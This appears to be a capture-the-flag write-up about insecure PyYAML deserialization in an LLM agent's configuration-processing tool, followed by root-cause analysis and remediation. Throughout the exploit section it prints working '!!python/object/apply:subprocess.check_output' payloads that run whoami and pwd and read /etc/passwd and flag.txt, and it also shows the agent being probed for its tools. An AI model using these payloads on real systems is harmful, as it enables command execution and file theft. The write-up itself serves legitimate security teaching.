@@ -1,0 +1,508 @@
+---
+title: "The Shape Shifter"
+description: "Insecure YAML deserialization leading to remote code execution"
+sidebar:
+  order: 1
+---
+
+| Field              | Detail                                                         |
+| ------------------ | -------------------------------------------------------------- |
+| **Track**          | Expert                                                         |
+| **Classification** | Insecure YAML deserialization leading to remote code execution |
+
+
+## 1. Result
+
+**Flag obtained:** `flag-e4498e`
+
+**Status:** Mission accomplished. `"level_completed": true`
+
+The configuration processor deserialized attacker-controlled YAML with an unsafe PyYAML loader. `!!python/object/apply:subprocess.check_output` executed `cat flag.txt` and returned the file contents in the configuration summary.
+
+**Winning payload:**
+
+```json
+{
+  "message": "!!python/object/apply:subprocess.check_output\n- [\"cat\", \"flag.txt\"]"
+}
+```
+
+**API response (excerpt):**
+
+```text
+Value: b'flag-e4498e'
+level_completed: true
+```
+
+![cat flag.txt via YAML gadget returning flag-e4498e](/arkx-ninja-ctf/pasted-20260904143936.webp)
+
+![MISSION ACCOMPLISHED / FLAG ACQUIRED](/arkx-ninja-ctf/pasted-20260904144017.webp)
+
+
+**Configuration processor reconnaissance:**
+
+![Configuration processor tool listing](/arkx-ninja-ctf/pasted-20260904141607.webp)
+
+**Successful `whoami` execution:**
+
+![YAML gadget executing whoami as mcpuser](/arkx-ninja-ctf/pasted-20260904141525.webp)
+
+**Working directory obtained with `pwd`:**
+
+![YAML gadget executing pwd under /app/tmp](/arkx-ninja-ctf/pasted-20260904141636.webp)
+
+**`/etc/passwd` read (arbitrary file access):**
+
+![YAML gadget reading /etc/passwd](/arkx-ninja-ctf/pasted-20260904143845.webp)
+
+**Flag recovered:**
+
+![cat flag.txt via YAML gadget returning flag-e4498e](/arkx-ninja-ctf/pasted-20260904143936.webp)
+
+**Level complete:**
+
+![MISSION ACCOMPLISHED / FLAG ACQUIRED](/arkx-ninja-ctf/pasted-20260904144017.webp)
+
+### Confirmed result
+
+```text
+Command execution: CONFIRMED
+Execution account: mcpuser
+Flag: flag-e4498e
+```
+
+## 2. Exploit
+
+The target provides a configuration-processing function that accepts YAML and returns a summary of the parsed configuration.
+
+The intended functionality is to process configuration data. Testing demonstrated that the underlying YAML parser accepts Python-specific object construction tags.
+
+Under an unsafe PyYAML loader, the following YAML tag:
+
+```text 
+!!python/object/apply
+
+```
+
+can invoke a Python callable during deserialization.
+
+`subprocess.check_output` was selected because it executes a process and returns its standard output as a `bytes` object. The configuration processor then included the resulting object value in its response.
+
+The exploitation process consisted of:
+
+1. Identify the available configuration-processing tool.
+2. Confirm that ordinary YAML is accepted.
+3. Test a Python-specific YAML constructor.
+4. Execute `whoami` to prove code execution.
+5. Execute `pwd` to establish the process working directory.
+6. Read `/etc/passwd`, then `flag.txt`, with the same primitive.
+
+### 2.1 Identify the configuration-processing interface
+
+**Prompt:**
+
+```text
+list tools and usuage
+```
+
+**Rationale:**
+
+The first step was to determine which tool accepts the configuration and what input format it expects.
+
+The response identified:
+
+```text 
+process_config
+```
+
+with a description indicating that it processes and validates YAML and returns a summary of the resulting settings.
+
+The interface also exposed:
+
+```text 
+multi_tool_use.parallel
+```
+
+The agent then instructed the user to provide YAML configuration.
+
+![Configuration processor tool listing](/arkx-ninja-ctf/pasted-20260904141607.webp)
+
+---
+
+### 2.2 Confirm normal YAML processing
+
+A basic YAML document was submitted before attempting any special constructors.
+
+**Payload:**
+
+```yaml
+name: test
+value: 123
+```
+
+**Rationale:**
+
+The document contains only ordinary YAML types.
+
+This establishes that the processor accepts attacker-controlled YAML and that the application processes the resulting object rather than requiring a predefined serialized file.
+
+The configuration was accepted and summarized successfully.
+
+This established the baseline behavior needed to distinguish an ordinary YAML parsing failure from unsafe object construction.
+
+---
+
+### 2.3 Execute a command through a Python YAML constructor
+
+The next payload used the PyYAML-specific `!!python/object/apply` constructor.
+
+**Payload:**
+
+```yaml
+!!python/object/apply:subprocess.check_output
+- whoami
+```
+
+The same payload was submitted to the API as:
+
+```json 
+{
+  "message": "!!python/object/apply:subprocess.check_output\n- whoami"
+}
+```
+
+**Rationale:**
+
+`!!python/object/apply` is a Python-specific YAML constructor supported by unsafe PyYAML loaders. It causes the loader to invoke the referenced callable using the supplied sequence as its arguments.
+
+`subprocess.check_output` was selected because it provides a clear execution primitive while returning command output directly to the application.
+
+`whoami` was chosen as the initial command because it provides a deterministic proof of execution and identifies the account under which the service is running.
+
+This avoids prematurely relying on a particular filesystem location.
+
+**API response:**
+
+```json 
+{
+  "success": true,
+  "response": "Configuration processed successfully.\n\nSummary:\n- Type: bytes\n- Value: b'mcpuser\\n'\n\nIf you have more YAML configurations to process or need further details, feel free to share!",
+  "level_completed": false
+}
+```
+
+The output:
+
+```text
+b'mcpuser\n'
+```
+
+proves that the command executed and that its standard output was returned through the configuration summary.
+
+![YAML gadget executing whoami as mcpuser](/arkx-ninja-ctf/pasted-20260904141525.webp)
+
+**Conclusion:**
+
+Remote command execution was confirmed.
+
+The command executed with the privileges of:
+
+```text 
+mcpuser
+```
+
+---
+
+### 2.4 Determine the working directory
+
+The same deserialization primitive was used to execute `pwd`.
+
+**Payload:**
+
+```json 
+{
+  "message": "!!python/object/apply:subprocess.check_output\n- pwd"
+}
+```
+
+**Rationale:**
+
+The flag filename was not yet known to be located relative to the current process directory.
+
+Determining the current working directory avoids assuming that:
+
+```text 
+flag.txt
+```
+
+exists in the process's current directory.
+
+The same known execution primitive was reused so that the test did not introduce a new variable.
+
+**API response excerpt:**
+
+```text 
+Value returned: b'/app/tmp/tmph82qs42l\n'
+```
+
+The service therefore executes commands from:
+
+```text
+/app/tmp/tmph82qs42l
+```
+
+![YAML gadget executing pwd under /app/tmp](/arkx-ninja-ctf/pasted-20260904141636.webp)
+
+This also explains why a relative path such as `flag.txt` could produce a false negative if the flag is stored elsewhere.
+
+---
+
+### 2.5 Read files, including the flag
+
+`subprocess.check_output` accepts an argument vector. In YAML that is a sequence after the constructor tag. A nested JSON list in the chat `message` field is equivalent:
+
+```yaml
+!!python/object/apply:subprocess.check_output
+- cat
+- flag.txt
+```
+
+**Payload (arbitrary file read):**
+
+```json
+{
+  "message": "!!python/object/apply:subprocess.check_output\n- [\"cat\", \"/etc/passwd\"]"
+}
+```
+
+**API response:** `"success": true`. The summary contained `/etc/passwd` content as `bytes`. `"level_completed": false` at this step because the flag had not yet been read.
+
+![YAML gadget reading /etc/passwd](/arkx-ninja-ctf/pasted-20260904143845.webp)
+
+**Payload (flag):**
+
+```json
+{
+  "message": "!!python/object/apply:subprocess.check_output\n- [\"cat\", \"flag.txt\"]"
+}
+```
+
+**API response:**
+
+```json
+{
+  "success": true,
+  "response": "Configuration processed successfully.\nType: bytes\nValue: b'flag-e4498e'\n...",
+  "level_completed": true
+}
+```
+
+![cat flag.txt via YAML gadget returning flag-e4498e](/arkx-ninja-ctf/pasted-20260904143936.webp)
+
+![MISSION ACCOMPLISHED / FLAG ACQUIRED](/arkx-ninja-ctf/pasted-20260904144017.webp)
+
+### Exploit status
+
+| Test                              | Result                 |
+| --------------------------------- | ---------------------- |
+| User-controlled YAML accepted     | Confirmed              |
+| Python YAML constructor accepted  | Confirmed              |
+| `subprocess.check_output` invoked | Confirmed              |
+| OS command execution              | Confirmed              |
+| Execution identity                | `mcpuser`              |
+| Working directory                 | `/app/tmp/tmph82qs42l` |
+| Arbitrary file read               | `/etc/passwd`          |
+| Flag recovered                    | `flag-e4498e`          |
+
+## 3. Root Cause
+
+The root cause is **unsafe deserialization of attacker-controlled YAML using a PyYAML loader that permits Python object construction**.
+
+The application intends to process configuration data. Instead, the YAML parser is capable of reconstructing Python objects and invoking Python callables during deserialization.
+
+This converts a data-processing feature into a code-execution primitive.
+
+### 3.1 Unsafe PyYAML deserialization
+
+A secure YAML parser should treat user-supplied configuration as data.
+
+An unsafe PyYAML loader can interpret Python-specific tags such as:
+
+```text 
+!!python/object/apply
+```
+
+and use them to construct or invoke Python objects.
+
+The successful invocation of:
+
+```text 
+subprocess.check_output
+```
+
+demonstrates that the loader was operating with capabilities beyond ordinary YAML parsing.
+
+### 3.2 User-controlled data reaches a code-execution primitive
+
+The attacker controls the complete YAML document.
+
+The application then passes that document into the YAML deserialization layer.
+
+The effective security boundary is therefore:
+
+```text 
+Attacker-controlled YAML
+        ↓
+YAML parser
+        ↓
+Python object construction
+        ↓
+Callable invocation
+        ↓
+Operating-system command
+```
+
+The vulnerability exists before the language model's response formatting occurs.
+
+The model is only the delivery interface. The underlying parser is responsible for executing the attacker-controlled constructor.
+
+### 3.3 Output formatting amplified the vulnerability
+
+The configuration processor returns a summary containing both the resulting object type and value.
+
+That behavior is harmless for ordinary configuration values.
+
+However, after deserialization executes:
+
+```text 
+subprocess.check_output
+```
+
+the returned `bytes` object contains command output.
+
+The application therefore reflects the result of the attacker-controlled command back to the user:
+
+```text
+Type: bytes
+Value: b'mcpuser\n'
+```
+
+This made exploitation straightforward and removed the need for a separate blind-execution channel.
+
+
+### Root cause summary
+
+The vulnerability results from:
+
+1. Accepting attacker-controlled YAML.
+2. Deserializing the YAML with an unsafe PyYAML loader.
+3. Allowing Python-specific constructors.
+4. Allowing constructors to invoke arbitrary Python callables.
+5. Providing access to `subprocess.check_output`.
+6. Returning the resulting command output to the attacker.
+
+The fundamental security failure is **deserialization of untrusted data with executable Python object support**.
+
+## 4. Impact and Severity
+
+**Severity: Critical**
+
+Remote code execution was directly demonstrated on the configuration-processing service.
+
+The attacker can execute operating-system commands as the service account:
+
+```text 
+mcpuser
+```
+
+The working directory was confirmed as:
+
+```text 
+/app/tmp/tmph82qs42l
+```
+
+### Confidentiality impact
+
+The demonstrated execution primitive can potentially access any files readable by `mcpuser`.
+
+This may include:
+
+* application configuration;
+* environment data;
+* credentials;
+* API tokens;
+* source code;
+* temporary files;
+* service configuration;
+* other secrets accessible to the process.
+
+`/etc/passwd` and `flag.txt` were both read through the same primitive. The flag value returned in the summary was `flag-e4498e`.
+
+### Integrity impact
+
+Because the attacker can execute arbitrary commands in the service context, files and other resources writable by `mcpuser` may potentially be modified.
+
+The exact extent depends on the permissions and isolation of the execution environment.
+
+### Availability impact
+
+Arbitrary command execution can potentially be abused to consume CPU, memory, disk space, or other resources available to the compromised service.
+
+The actual availability impact was not tested during the challenge.
+
+### Attacker capabilities demonstrated
+
+| Capability                         | Demonstrated                    |
+| ---------------------------------- | ------------------------------- |
+| Submit attacker-controlled YAML    | Yes                             |
+| Trigger Python object construction | Yes                             |
+| Invoke `subprocess.check_output`   | Yes                             |
+| Execute OS commands                | Yes                             |
+| Obtain command output              | Yes                             |
+| Identify service account           | Yes                             |
+| Determine working directory        | Yes                             |
+| Read arbitrary files               | Yes (`/etc/passwd`, `flag.txt`) |
+| Recover `flag.txt`                 | Yes (`flag-e4498e`)             |
+
+
+The appropriate severity is **Critical** because remote code execution and arbitrary file read were demonstrated. This report does not claim persistence or full host compromise.
+
+## 5. Mapping
+
+| Framework                                  | Category                                                              | Relevance                                                                                                                                                |
+| ------------------------------------------ | --------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **OWASP Top 10:2021**                      | **A08: Software and Data Integrity Failures**                         | Untrusted serialized data is processed in a way that permits executable Python object construction.                                                      |
+| **OWASP Top 10 for LLM Applications 2025** | **LLM06: Excessive Agency**                                           | A configuration-processing capability has access to operating-system command execution far beyond the intended configuration-processing task.            |
+| **OWASP Top 10 for LLM Applications 2025** | **LLM02: Sensitive Information Disclosure**                           | Command output is reflected through the configuration summary, and the execution primitive can potentially access data available to the service account. |
+| **OWASP Top 10 for LLM Applications 2023** | **LLM07: Insecure Plugin Design**                                     | The backend tool accepts attacker-controlled input and performs unsafe deserialization without an appropriate execution boundary.                        |
+| **CWE-502**                                | **Deserialization of Untrusted Data**                                 | Attacker-controlled YAML is deserialized using functionality capable of constructing executable Python objects.                                          |
+| **CWE-78**                                 | **Improper Neutralization of Special Elements used in an OS Command** | The deserialization vulnerability ultimately provides an OS command-execution primitive through `subprocess.check_output`.                               |
+
+### Primary classification
+
+**Insecure YAML Deserialization leading to Remote Code Execution**
+
+The central vulnerability is not the specific `whoami` payload.
+
+The fundamental problem is that the configuration processor treats attacker-controlled YAML as trusted serialized Python data and permits Python-specific constructors to execute during deserialization.
+
+The successful invocation of:
+
+```text 
+subprocess.check_output
+```
+
+provides direct evidence of remote code execution.
+
+### Remediation
+
+The application should:
+
+1. Use `yaml.safe_load()` for untrusted YAML.
+2. Do not use `yaml.load()` with unsafe loaders on attacker-controlled data.
+3. Explicitly reject `!!python/*` constructors.
+4. Prefer a restricted configuration format such as JSON when YAML-specific functionality is unnecessary.
+5. Validate the resulting data against an explicit schema.
+6. Run configuration processing with a dedicated low-privilege service account.
+
+The most important remediation is to ensure that configuration parsing remains a **data deserialization operation and cannot invoke arbitrary Python code**.
